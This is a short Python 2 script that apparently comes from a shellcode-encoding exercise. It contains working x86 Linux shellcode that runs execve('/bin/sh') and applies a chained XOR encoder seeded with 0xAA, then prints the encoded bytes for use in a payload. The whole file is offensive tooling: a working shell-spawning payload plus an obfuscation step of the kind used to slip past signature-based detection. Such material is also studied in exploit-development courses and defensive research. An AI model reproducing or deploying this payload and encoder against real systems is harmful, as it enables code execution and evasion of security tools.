#!/usr/bin/env python


#shellcode executes execve("/bin/sh", 0, 0)
shellcode = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
"\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd"
"\x80")


encoded = []
encoded.append(0xAA)

print 'Encoded shellcode ...\n'

for i in range(0, len(shellcode)):
    b1 = ord(shellcode[i]) ^ encoded[i]
    encoded.append(b1)

print 'Len: %d' % len(bytearray(shellcode))
print ", ".join(hex(c) for c in encoded[1::])
